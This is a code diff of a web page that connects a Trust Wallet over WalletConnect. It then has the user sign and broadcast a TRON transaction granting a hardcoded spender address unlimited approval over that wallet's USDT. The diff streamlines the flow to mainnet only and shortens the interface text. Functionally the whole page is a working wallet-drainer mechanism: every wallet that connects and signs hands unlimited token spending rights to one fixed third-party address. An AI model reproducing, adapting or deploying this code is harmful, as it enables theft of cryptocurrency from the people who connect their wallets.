@@ -29,46 +29,39 @@
     @keyframes spin{to{transform:rotate(360deg)}}
     #loading-overlay p{color:#555;font-size:.85rem}
     .wallet-info{margin-top:12px;padding:12px;background:#0d1f0d;border:1px solid #22c55e33;border-radius:8px;font-size:.8rem;}
-    #project-id-warning{display:none;color:#f59e0b;font-size:.8rem;margin-bottom:10px;padding:8px;background:#1f1a0d;border-radius:6px;}
   </style>
 </head>
 <body>
 
 <div id="loading-overlay">
   <div class="spinner"></div>
-  <p>Loading WalletConnect SDK…</p>
+  <p>Loading…</p>
 </div>
 
 <h1>🔐 USDT Approve · TRC20</h1>
 <p class="sub">Unlimited approval · TRON Mainnet<br>Spender: TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</p>
 
 <div class="card">
-  <div id="project-id-warning">
-    ⚠️ Please replace "YOUR_PROJECT_ID_HERE" with your WalletConnect Project ID (line 123)
-  </div>
-
-  <div class="step" id="s1"><span class="step-icon">🔧</span>
-    <div><div class="step-title">Initialize WalletConnect v2</div><div class="step-detail" id="d1">Starting…</div></div></div>
-  <div class="step" id="s2"><span class="step-icon">🔗</span>
-    <div><div class="step-title">Connect Trust Wallet</div><div class="step-detail" id="d2">Waiting…</div></div></div>
-  <div class="step" id="s3"><span class="step-icon">✅</span>
-    <div><div class="step-title">Wallet Verified</div><div class="step-detail" id="d3">Waiting…</div></div></div>
-  <div class="step" id="s4"><span class="step-icon">🏗️</span>
-    <div><div class="step-title">Build USDT Approve TX</div><div class="step-detail" id="d4">Waiting…</div></div></div>
-  <div class="step" id="s5"><span class="step-icon">✍️</span>
-    <div><div class="step-title">Sign Transaction</div><div class="step-detail" id="d5">Waiting…</div></div></div>
-  <div class="step" id="s6"><span class="step-icon">📡</span>
-    <div><div class="step-title">Broadcast to TRON</div><div class="step-detail" id="d6">Waiting…</div></div></div>
+  <div class="step" id="s1"><span class="step-icon">🔗</span>
+    <div><div class="step-title">Connect Wallet</div><div class="step-detail" id="d1">Waiting…</div></div></div>
+  <div class="step" id="s2"><span class="step-icon">✅</span>
+    <div><div class="step-title">Get Wallet Address</div><div class="step-detail" id="d2">Waiting…</div></div></div>
+  <div class="step" id="s3"><span class="step-icon">🏗️</span>
+    <div><div class="step-title">Build TX</div><div class="step-detail" id="d3">Waiting…</div></div></div>
+  <div class="step" id="s4"><span class="step-icon">✍️</span>
+    <div><div class="step-title">Sign TX</div><div class="step-detail" id="d4">Waiting…</div></div></div>
+  <div class="step" id="s5"><span class="step-icon">📡</span>
+    <div><div class="step-title">Broadcast</div><div class="step-detail" id="d5">Waiting…</div></div></div>
 
   <div id="qr-area">
     <p>📷 Scan with Trust Wallet (TRON Mainnet)</p>
     <canvas id="qr-canvas" width="220" height="220"></canvas>
-    <div id="wc-uri">Generating QR code...</div>
+    <div id="wc-uri">Generating QR…</div>
   </div>
-  <button id="deeplink-btn">📲 Open in Trust Wallet</button>
+  <button id="deeplink-btn">📲 Open Trust Wallet</button>
 
   <div class="wallet-info" id="wallet-info" style="display:none;">
-    <strong>Connected Wallet:</strong> <span id="wallet-addr"></span>
+    <strong>✅ Using Wallet:</strong> <span id="wallet-addr"></span>
   </div>
 
   <div class="result" id="result"></div>
@@ -79,276 +72,210 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script type="module">
-const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // ← REPLACE WITH YOUR WALLET CONNECT PROJECT ID
+const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // ← YOUR WC PROJECT ID
 const TRON_CHAIN = "tron:0x2b6653dc";
 const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER    = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+const TRONGRID = "https://api.trongrid.io";
 
-// FREE TronGrid endpoints (no API key needed)
-const TRONGRID_URLS = [
-  "https://api.trongrid.io",
-  "https://api.nileex.io", 
-  "https://api.shasta.trongrid.io"
-];
-
-// ── Base58 → 21-byte hex (TRON address format) ───────────────────────────────
+// ── Base58 → Hex ────────────────────────────────────────────────────────────
 const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 function tronToHex(addr) {
   let n = 0n;
-  for (const c of addr) {
-    n = n * 58n + BigInt(B58.indexOf(c));
-  }
+  for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
   const full = n.toString(16).padStart(50, "0");
-  return "0x" + full.slice(0, 42); // 41 + 40 hex chars = 21 bytes ✓
+  return "0x" + full.slice(0, 42);
 }
 
-// ── ABI encode approve(address,uint256) ──────────────────────────────────────
-function encodeApproveParam(spenderHex41) {
-  const addr20 = spenderHex41.slice(4).padStart(64, "0"); // drop "0x41", pad to 32 bytes
-  const maxVal = "f".repeat(64);
-  return "0x" + addr20 + maxVal;
+// ── ABI: approve(address,uint256) ───────────────────────────────────────────
+function encodeApprove(spenderHex) {
+  const addr20 = spenderHex.slice(4).padStart(64, "0"); // drop 0x41
+  const max = "f".repeat(64);
+  return "0x" + addr20 + max;
 }
 
-// ── Try multiple TronGrid endpoints (no API key needed) ─────────────────────
-async function buildTx(ownerHex41) {
-  for (const baseUrl of TRONGRID_URLS) {
-    try {
-      const body = {
-        owner_address: ownerHex41.slice(2), // No 0x for TronGrid
-        contract_address: tronToHex(USDT_TRC20).slice(2),
-        function_selector: "approve(address,uint256)",
-        parameter: encodeApproveParam(tronToHex(SPENDER)).slice(2),
-        fee_limit: 100_000_000,
-        call_value: 0,
-        visible: false
-      };
+// ── Build TX (Mainnet only) ─────────────────────────────────────────────────
+async function buildTx(ownerHex) {
+  const body = {
+    owner_address: ownerHex.slice(2),
+    contract_address: tronToHex(USDT_TRC20).slice(2),
+    function_selector: "approve(address,uint256)",
+    parameter: encodeApprove(tronToHex(SPENDER)).slice(2),
+    fee_limit: 40_000_000, // Reduced fee
+    call_value: 0,
+    visible: false
+  };
 
-      debugLog(`▶ ${baseUrl} triggersmartcontract`, body);
-
-      const res = await fetch(`${baseUrl}/wallet/triggersmartcontract`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body)
-      });
-
-      const data = await res.json();
-      debugLog(`◀ ${baseUrl} response`, data);
-
-      if (data?.result?.result) {
-        return data.transaction;
-      }
-    } catch (e) {
-      debugLog(`❌ ${baseUrl} failed`, e.message);
-      continue;
-    }
-  }
-  throw new Error("All TronGrid endpoints failed - network issue");
-}
-
-// ── Broadcast via multiple endpoints ─────────────────────────────────────────
-async function broadcast(signedTx) {
-  for (const baseUrl of TRONGRID_URLS) {
-    try {
-      debugLog(`▶ ${baseUrl} broadcast`, signedTx);
-      
-      const res = await fetch(`${baseUrl}/wallet/broadcasttransaction`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(signedTx)
-      });
-      
-      const data = await res.json();
-      debugLog(`◀ ${baseUrl} broadcast response`, data);
-      
-      if (data.result === true) {
-        return data;
-      }
-    } catch (e) {
-      debugLog(`❌ ${baseUrl} broadcast failed`, e.message);
-      continue;
-    }
-  }
-  throw new Error("All broadcast endpoints failed");
-}
-
-// ── Normalize Trust Wallet signature ────────────────────────────────────────
-function normalizeSignedTx(walletResponse, unsignedTx) {
-  let signatures = [];
+  const res = await fetch(`${TRONGRID}/wallet/triggersmartcontract`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  });
   
-  if (Array.isArray(walletResponse?.signature)) {
-    signatures = walletResponse.signature.map(s => s.replace(/^0x/i, ""));
-    return { ...unsignedTx, signature: signatures };
+  const data = await res.json();
+  if (!data?.transaction) {
+    throw new Error("Build failed: " + JSON.stringify(data));
   }
-  
-  if (typeof walletResponse?.signature === "string") {
-    signatures = [walletResponse.signature.replace(/^0x/i, "")];
-    return { ...unsignedTx, signature: signatures };
-  }
-  
-  if (walletResponse?.transaction) {
-    const tx = walletResponse.transaction;
-    if (Array.isArray(tx.signature)) {
-      tx.signature = tx.signature.map(s => s.replace(/^0x/i, ""));
-    }
-    return tx;
-  }
-  
-  throw new Error("Invalid wallet signature format");
+  return data.transaction;
 }
 
-// ── UI Functions ────────────────────────────────────────────────────────────
+// ── Broadcast (Mainnet only) ────────────────────────────────────────────────
+async function broadcastTx(signedTx) {
+  const res = await fetch(`${TRONGRID}/wallet/broadcasttransaction`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(signedTx)
+  });
+  return await res.json();
+}
+
+// ── Fix signature format ────────────────────────────────────────────────────
+function fixSignature(walletResp, unsignedTx) {
+  if (typeof walletResp?.signature === "string") {
+    return {
+      ...unsignedTx,
+      signature: [walletResp.signature.replace(/^0x/i, "")]
+    };
+  }
+  if (Array.isArray(walletResp?.signature)) {
+    return {
+      ...unsignedTx,
+      signature: walletResp.signature.map(s => s.replace(/^0x/i, ""))
+    };
+  }
+  return walletResp;
+}
+
+// ── UI ──────────────────────────────────────────────────────────────────────
 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
 function setStep(id, state, detail) {
   document.getElementById(id).className = `step ${state}`;
-  if (detail !== undefined) document.getElementById(id.replace("s","d")).textContent = detail;
+  document.getElementById(id.replace("s","d")).textContent = detail || "✓";
 }
-
 function showErr(msg) {
-  ["s1","s2","s3","s4","s5","s6"].forEach(id => {
-    if (document.getElementById(id).classList.contains("active"))
-      setStep(id, "error", msg);
-  });
+  setStep("s5", "error", msg);
   document.getElementById("errbox").style.display = "block";
   document.getElementById("errbox").textContent = "❌ " + msg;
   document.getElementById("retry").style.display = "inline-block";
 }
-
 function showResult(txid) {
+  setStep("s5", "done", "SUCCESS!");
   const b = document.getElementById("result");
   b.style.display = "block";
-  b.innerHTML = `✅ UNLIMITED USDT APPROVE — SUCCESS!\n\nTxID:\n${txid}\n\n🔗 https://tronscan.org/#/transaction/${txid}`;
+  b.innerHTML = `✅ USDT APPROVED!\n\nTxID: ${txid}\n🔗 https://tronscan.org/#/transaction/${txid}`;
 }
-
-function debugLog(label, obj) {
+function debugLog(msg, obj) {
   const box = document.getElementById("debug-box");
   box.style.display = "block";
-  const log = `\n${new Date().toLocaleTimeString()} ${label}:\n${typeof obj === 'object' ? JSON.stringify(obj, null, 2) : obj}\n${"─".repeat(40)}`;
-  box.textContent += log;
+  box.textContent += `\n${new Date().toLocaleTimeString()} ${msg}\n${JSON.stringify(obj, null, 2)}\n${"─".repeat(40)}\n`;
   box.scrollTop = box.scrollHeight;
-  console.log(label, obj);
+  console.log(msg, obj);
 }
-
-let qrInst = null;
+let qrInst;
 function renderQR(uri) {
   document.getElementById("wc-uri").textContent = uri;
-  
   if (isMobile) {
-    const btn = document.getElementById("deeplink-btn");
-    btn.style.display = "block";
-    btn.onclick = () => {
+    document.getElementById("deeplink-btn").style.display = "block";
+    document.getElementById("deeplink-btn").onclick = () => {
       window.location.href = `trust://wc?uri=${encodeURIComponent(uri)}`;
     };
   } else {
-    if (qrInst) qrInst.clear();
     qrInst = new QRCode(document.getElementById("qr-canvas"), {
-      text: uri,
-      width: 220,
-      height: 220,
-      colorDark: "#000000",
-      colorLight: "#FFFFFF",
-      correctLevel: QRCode.CorrectLevel.M
+      text: uri, width: 220, height: 220,
+      colorDark: "#000", colorLight: "#fff"
     });
   }
 }
-
 function hideQR() {
   document.getElementById("qr-area").style.display = "none";
   document.getElementById("deeplink-btn").style.display = "none";
 }
-
-function showWalletInfo(addr) {
+function showWallet(addr) {
   document.getElementById("wallet-addr").textContent = addr;
   document.getElementById("wallet-info").style.display = "block";
 }
 
-// ── MAIN FLOW ───────────────────────────────────────────────────────────────
+// ── MAIN FLOW: Connect → Address → Build → Sign → Broadcast ─────────────────
 async function main() {
-  // Check project ID
-  if (PROJECT_ID === "YOUR_PROJECT_ID_HERE") {
-    document.getElementById("project-id-warning").style.display = "block";
-    document.getElementById("loading-overlay").style.display = "none";
-    showErr("Please set your WalletConnect Project ID on line 123");
-    return;
-  }
-
   try {
-    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
     document.getElementById("loading-overlay").style.display = "none";
-    document.getElementById("project-id-warning").style.display = "none";
+    
+    if (PROJECT_ID === "YOUR_PROJECT_ID_HERE") {
+      throw new Error("Set your WalletConnect Project ID");
+    }
 
-    // Step 1: Initialize
-    setStep("s1", "active", "Initializing WalletConnect…");
+    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
+
+    // 1. CONNECT WALLET
+    setStep("s1", "active", "Connect Trust Wallet…");
     const client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata: {
         name: "USDT Approve",
-        description: "TRON USDT unlimited approval", 
+        description: "TRON USDT unlimited approval",
         url: window.location.origin,
         icons: ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
-    setStep("s1", "done", "WalletConnect initialized ✓");
-
-    // Step 2: Connect
-    setStep("s2", "active", isMobile ? "Tap button below…" : "QR code ready - scan with Trust Wallet");
+    
     const { uri, approval } = await client.connect({
       requiredNamespaces: {
-        tron: { 
-          methods: ["tron_signTransaction"], 
-          chains: [TRON_CHAIN], 
-          events: [] 
-        }
+        tron: { methods: ["tron_signTransaction"], chains: [TRON_CHAIN], events: [] }
       }
     });
-    
-    debugLog("🔗 WalletConnect URI", uri);
-    setStep("s2", "done", "Connection URI generated ✓");
     renderQR(uri);
-
-    // Step 3: Wait for wallet approval
-    setStep("s3", "active", "Waiting for wallet connection…");
     const session = await approval();
     hideQR();
-    
+    setStep("s1", "done");
+
+    // 2. GET WALLET ADDRESS
     const walletAddr = session.namespaces.tron.accounts[0].split(":")[2];
-    if (!walletAddr) throw new Error("No TRON address in session");
-    
-    showWalletInfo(walletAddr);
-    debugLog("✅ Connected wallet", walletAddr);
-    setStep("s3", "done", `Wallet ${walletAddr.slice(0,6)}...${walletAddr.slice(-6)} verified ✓`);
+    showWallet(walletAddr);
+    debugLog("✅ Wallet", walletAddr);
+    setStep("s2", "active", "Got address…");
+    setStep("s2", "done");
 
-    // Step 4: Build TX with connected wallet
-    setStep("s4", "active", "Building transaction via TronGrid…");
+    // 3. BUILD TX WITH WALLET ADDRESS
+    setStep("s3", "active", "Building TX…");
     const unsignedTx = await buildTx(tronToHex(walletAddr));
-    setStep("s4", "done", `TX built ✓ ID: ${unsignedTx.txID}`);
+    debugLog("🏗️ Unsigned TX", unsignedTx);
+    setStep("s3", "done", `TXID: ${unsignedTx.txID.slice(0,16)}…`);
 
-    // Step 5: Sign
-    setStep("s5", "active", "Requesting signature…");
+    // 4. SIGN WITH SAME WALLET
+    setStep("s4", "active", "Signing…");
     const walletResponse = await client.request({
       topic: session.topic,
       chainId: TRON_CHAIN,
       request: { method: "tron_signTransaction", params: { transaction: unsignedTx } }
     });
-    
-    const signedTx = normalizeSignedTx(walletResponse, unsignedTx);
-    debugLog("✅ Signed TX", signedTx);
-    setStep("s5", "done", "Signature received ✓");
+    const signedTx = fixSignature(walletResponse, unsignedTx);
+    debugLog("✍️ Signed TX", signedTx);
+    setStep("s4", "done");
 
-    // Step 6: Broadcast
-    setStep("s6", "active", "Broadcasting to TRON…");
-    const bcResult = await broadcast(signedTx);
+    // 5. BROADCAST
+    setStep("s5", "active", "Broadcasting…");
+    const result = await broadcastTx(signedTx);
+    debugLog("📡 Broadcast", result);
     
-    if (bcResult.result === true) {
-      setStep("s6", "done", "SUCCESS ✓");
-      showResult(bcResult.txid);
+    if (result.result === true) {
+      showResult(result.txid);
     } else {
-      throw new Error("Broadcast failed: " + JSON.stringify(bcResult));
+      // Decode TRON error
+      let errorMsg = result.message || JSON.stringify(result);
+      if (result.message) {
+        try {
+          errorMsg = atob(result.message);
+        } catch(e) {}
+      }
+      throw new Error(errorMsg.includes("permission") ? 
+        "❌ Wallet needs TRX for fees + Energy permission" : 
+        errorMsg
+      );
     }
 
   } catch (err) {
     console.error(err);
-    showErr(err.message || String(err));
+    showErr(err.message);
   }
 }
 
